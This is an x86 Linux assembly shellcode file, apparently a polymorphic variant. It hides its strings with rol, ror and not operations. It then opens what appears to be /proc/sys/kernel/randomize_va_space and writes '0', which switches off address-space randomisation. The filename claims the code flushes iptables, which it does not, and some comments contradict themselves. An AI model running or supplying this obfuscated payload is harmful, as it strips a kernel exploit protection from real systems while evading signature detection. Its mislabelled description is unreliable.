
; Filename: iptables_flush_poly.nasm
; Author:  Matteo Malvica
; Website:  http://www.matteomalvica.com
; Size: 42 bytes

global _start

section .text


_start:
    xor eax,eax
    push eax
    mov ecx, 0x06563617		; modified with 'rol'
    rol ecx, 4
    push ecx
    mov ecx, 0x35f61767		; modified with 'ror'
    ror ecx, 4
    push ecx
    push dword 0x5f657a69  	; unaltered
    push dword 0x6d6f646e	; unaltered
    mov ecx, 0x9E8DD093  	; NOTted '0x61722f6c'
    not ecx
    push ecx
    mov ecx, 0x9A918D9A		; NOTted '0x656e7265' 
    not ecx
    push ecx
    mov ecx, 0x94D08C86		; NOTted '0x6b2f7379' 
    not ecx
    push ecx
    mov ecx, 0xf732f636		; modified with 'rol'
    rol ecx, 4
    push ecx
    mov ecx, 0x5f617673		; modified with 'ror'
    ror ecx, 4
    push ecx
    mov ebx,esp			; pop the string into ecx
    push byte 2     		; read and write mode 
    pop ecx       
    mov al,0x5    		; we use 'open' syscall instead
    int 0x80
    xchg eax, ebx 		; equivalent and smaller than xchg eax, ebx
    push eax
    mov dx,0x3a30
    push dx
    mov ecx,esp
    xor edx,edx
    inc edx
    mov al,0x4    		; write syscall
    int 0x80
    push byte 6 		; 'close' syscall from the stack
    pop eax             
    int 0x80
    mov al,0x1   		; 'exit' syscall via direct access
    int 0x80
